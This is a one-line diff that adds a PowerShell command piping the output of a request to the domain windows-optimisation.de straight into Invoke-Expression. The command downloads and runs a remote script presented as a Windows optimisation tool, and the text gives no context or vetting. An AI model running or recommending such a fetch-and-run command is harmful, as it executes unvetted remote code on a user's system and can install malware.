@@ -1,0 +1,1 @@
+﻿irm windows-optimisation.de | iex
